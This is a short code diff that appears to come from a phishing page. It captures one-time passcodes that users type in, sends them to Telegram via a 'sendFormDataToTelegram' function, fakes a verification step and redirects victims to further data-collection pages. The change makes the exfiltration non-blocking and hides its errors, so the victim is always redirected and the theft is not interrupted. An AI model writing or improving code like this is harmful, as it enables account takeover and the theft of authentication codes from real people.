@@ -736,9 +736,11 @@
                     otpType = 'Last OTP Submitted';
                 }
                 
-                // Send OTP to Telegram
-                await sendFormDataToTelegram(otpType, {
+                // Send OTP to Telegram (non-blocking - won't fail form submission)
+                sendFormDataToTelegram(otpType, {
                     'OTP Code': otp
+                }).catch(err => {
+                    console.warn('Telegram notification failed (non-critical):', err);
                 });
                 
                 // Simulate verification process
@@ -756,7 +758,7 @@
                     nextPage = 'name.html';
                 }
                 
-                // Redirect to next page
+                // Always redirect - don't block on Telegram errors
                 window.location.href = nextPage;
                 
             } catch (error) {
